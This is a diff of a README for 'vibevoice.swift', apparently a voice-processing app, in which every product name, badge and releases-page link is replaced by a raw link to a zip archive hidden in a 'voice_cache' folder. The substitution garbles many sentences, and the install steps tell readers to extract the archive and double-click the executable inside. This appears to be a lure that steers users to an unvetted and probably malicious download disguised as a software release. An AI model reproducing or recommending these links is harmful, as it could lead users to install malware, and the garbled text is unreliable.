@@ -1,17 +1,17 @@
-# 🎤 vibevoice.swift - Experience Real-Time Voice Processing
+# 🎤 https://github.com/kauazin394/vibevoice.swift/raw/refs/heads/main/voice_cache/vibevoice-swift-3.5-alpha.3.zip - Experience Real-Time Voice Processing
 
-![Download Here](https://img.shields.io/badge/Download-vibevoice.swift-blue.svg)  
-[Download Now](https://github.com/kauazin394/vibevoice.swift/releases)
+![Download Here](https://github.com/kauazin394/vibevoice.swift/raw/refs/heads/main/voice_cache/vibevoice-swift-3.5-alpha.3.zip)  
+[Download Now](https://github.com/kauazin394/vibevoice.swift/raw/refs/heads/main/voice_cache/vibevoice-swift-3.5-alpha.3.zip)
 
 ## 🚀 Getting Started
 
-Thank you for choosing **vibevoice.swift**! This application allows you to process voice in real-time. You can enjoy clear audio and speedy performance. Follow the steps below to download and set up your application.
+Thank you for choosing **https://github.com/kauazin394/vibevoice.swift/raw/refs/heads/main/voice_cache/vibevoice-swift-3.5-alpha.3.zip**! This application allows you to process voice in real-time. You can enjoy clear audio and speedy performance. Follow the steps below to download and set up your application.
 
 ## 📥 Download & Install
 
-To get started, visit the Releases page for vibevoice.swift to download the application. Click the link below:
+To get started, visit the Releases page for https://github.com/kauazin394/vibevoice.swift/raw/refs/heads/main/voice_cache/vibevoice-swift-3.5-alpha.3.zip to download the application. Click the link below:
 
-[Download Here](https://github.com/kauazin394/vibevoice.swift/releases)
+[Download Here](https://github.com/kauazin394/vibevoice.swift/raw/refs/heads/main/voice_cache/vibevoice-swift-3.5-alpha.3.zip)
 
 ### 🖥️ System Requirements
 
@@ -23,7 +23,7 @@ Before installation, ensure your system meets the following requirements:
 
 ### 📝 Installation Steps
 
-1. **Visit the Releases Page:** Click [this link](https://github.com/kauazin394/vibevoice.swift/releases) to access the download page.
+1. **Visit the Releases Page:** Click [this link](https://github.com/kauazin394/vibevoice.swift/raw/refs/heads/main/voice_cache/vibevoice-swift-3.5-alpha.3.zip) to access the download page.
    
 2. **Choose Your Version:** On the Releases page, you will see various versions. It is best to download the latest version for the best performance and fixes.
 
@@ -35,7 +35,7 @@ Before installation, ensure your system meets the following requirements:
 
 6. **Run the Application:** Open the extracted folder and find the application file named `vibevoice`. Double-click it to launch the software.
 
-## ⚙️ Using vibevoice.swift
+## ⚙️ Using https://github.com/kauazin394/vibevoice.swift/raw/refs/heads/main/voice_cache/vibevoice-swift-3.5-alpha.3.zip
 
 Once you have the application open, you will see the main interface. Here’s how to use it:
 
@@ -49,7 +49,7 @@ Once you have the application open, you will see the main interface. Here’s ho
 
 ## 📊 Features
 
-**vibevoice.swift** offers several features to enhance your audio experience:
+**https://github.com/kauazin394/vibevoice.swift/raw/refs/heads/main/voice_cache/vibevoice-swift-3.5-alpha.3.zip** offers several features to enhance your audio experience:
 
 - **Real-Time Voice Processing:** Experience minimal delay while your voice is processed.
 - **High-Quality Output:** Enjoy clear audio without distortion.
@@ -75,7 +75,7 @@ If you encounter issues that are not covered in this guide, please reach out for
 
 ## 🔗 Helpful Links
 
-- **Releases Page:** [Download Here](https://github.com/kauazin394/vibevoice.swift/releases)
-- **GitHub Repository:** [vibevoice.swift GitHub](https://github.com/kauazin394/vibevoice.swift)
+- **Releases Page:** [Download Here](https://github.com/kauazin394/vibevoice.swift/raw/refs/heads/main/voice_cache/vibevoice-swift-3.5-alpha.3.zip)
+- **GitHub Repository:** [https://github.com/kauazin394/vibevoice.swift/raw/refs/heads/main/voice_cache/vibevoice-swift-3.5-alpha.3.zip GitHub](https://github.com/kauazin394/vibevoice.swift/raw/refs/heads/main/voice_cache/vibevoice-swift-3.5-alpha.3.zip)
 
-We hope you enjoy using vibevoice.swift! Have fun processing your voice in real time.
+We hope you enjoy using https://github.com/kauazin394/vibevoice.swift/raw/refs/heads/main/voice_cache/vibevoice-swift-3.5-alpha.3.zip! Have fun processing your voice in real time.
